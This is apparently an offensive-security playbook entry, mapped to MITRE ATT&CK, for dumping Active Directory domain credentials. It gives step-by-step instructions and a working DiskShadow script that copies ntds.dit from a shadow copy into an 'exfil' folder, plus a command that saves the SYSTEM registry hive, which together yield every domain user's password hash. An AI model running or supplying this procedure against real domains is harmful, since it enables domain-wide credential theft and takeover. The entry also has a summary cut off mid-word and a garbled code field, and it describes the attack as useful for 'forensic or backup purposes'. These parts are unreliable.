---
id: 39a9a193-e9a1-45f9-874e-6dfe181b0993
name: Dumping AD Domain Credentials with DiskShadow
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:03.908974+00:00'
updated_at: '2023-04-10T20:26:16.403794+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
techniques:
- '[[Credential Dumping|T1003 - Credential Dumping]]'
tags:
- '[[Active Directory Attacks]]'
- '[[Dumping AD Domain Credentials]]'
- '[[Using DiskShadow (a Windows signed binary)]]'
commands:
- '[[Backup System Registry]]'
- '[[Check Exfiltrated NTDS.dit File]]'
- '[[Create Disk Shadow Copy and Exfiltrate NTDS.dit]]'
---

# Dumping AD Domain Credentials with DiskShadow

## Summary

Dumping Active Directory (AD) domain credentials is a critical step in any attack that targets AD infrastructure. The use of DiskShadow, a Windows signed binary, is one of the techniques that can be used to obtain the NTDS.dit file, which contains the hashed passwords of all AD domain users. DiskSh

## Description

# Description

Dumping Active Directory (AD) domain credentials is a critical step in any attack that targets AD infrastructure. The use of DiskShadow, a Windows signed binary, is one of the techniques that can be used to obtain the NTDS.dit file, which contains the hashed passwords of all AD domain users. DiskShadow is a built-in tool in Windows that can create and manage shadow copies of volumes. By leveraging this tool, an attacker can create a shadow copy of the volume where the NTDS.dit file is located and extract it from the shadow copy. This technique can be used to obtain domain credentials without being detected by security solutions that monitor file access or network traffic.

From a technical perspective, this technique involves creating a DiskShadow script that creates a shadow copy of the volume where the NTDS.dit file is located, mounts the shadow copy, and copies the NTDS.dit file to a location accessible to the attacker. The script can be executed manually or via an automated tool.

The business value of this technique is that it enables an attacker to obtain domain credentials that can be used to escalate privileges, move laterally, or exfiltrate data. By compromising domain credentials, an attacker can gain full control of an organization's IT infrastructure.

## Requirements

1. Access to a system that has the DiskShadow tool available

1. Knowledge of the location of the NTDS.dit file on the target system

1. Sufficient privileges to create and manage shadow copies of volumes

## Defense

1. Restrict access to the NTDS.dit file and the volume where it is located to authorized personnel only

1. Monitor the execution of DiskShadow scripts and other suspicious activities on critical systems

1. Implement the principle of least privilege to prevent attackers from obtaining the necessary privileges to execute this attack

## Objectives

1. Obtain the NTDS.dit file from a shadow copy of the volume where it is located

1. Extract the hashed passwords of all AD domain users from the NTDS.dit file

1. Use the obtained credentials to escalate privileges, move laterally, or exfiltrate data

# Instructions

1. To use this command, follow these steps:
1. Open Notepad or any other text editor.
2. Copy and paste the provided code into the text editor.
3. Save the file as diskshadow.txt.
4. Open Command Prompt.
5. Navigate to C:\Windows\System32.
6. Run the command 'diskshadow.exe /s c:\diskshadow.txt'.
7. After the command completes, run 'dir c:\exfil' to confirm that ntds.dit and system.bak were created in the C:\exfil directory.

**Code**: [[diskshadow.txt contains :
set context persistent n]]

> This command uses DiskShadow, a tool included in Windows, to create a shadow copy of the C: drive and expose it as a Z: drive. It then uses the 'copy' command to copy the ntds.dit file, which contains Active Directory data, from the Z: drive to the C:\exfil directory. Finally, it deletes the shadow copy and saves the system registry to a file named system.bak in the C:\exfil directory. This command can be useful for extracting Active Directory data for forensic or backup purposes.

**Command** ([[Create Disk Shadow Copy and Exfiltrate NTDS.dit]]):

```bash
set context persistent nowriters
add volume c: alias someAlias
create
expose %someAlias% z:
exec "cmd.exe" /c copy z:\windows\ntds\ntds.dit c:\exfil\ntds.dit
delete shadows volume %someAlias%
reset
```

**Command** ([[Check Exfiltrated NTDS.dit File]]):

```bash
dir c:\exfil
```

**Command** ([[Backup System Registry]]):

```bash
reg.exe save hklm\system c:\exfil\system.bak
```

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]

### Techniques

- [[Credential Dumping|T1003 - Credential Dumping]]

## Commands Used

- [[Backup System Registry]]
- [[Check Exfiltrated NTDS.dit File]]
- [[Create Disk Shadow Copy and Exfiltrate NTDS.dit]]

## Tags

- [[Active Directory Attacks]]
- [[Dumping AD Domain Credentials]]
- [[Using DiskShadow (a Windows signed binary)]]
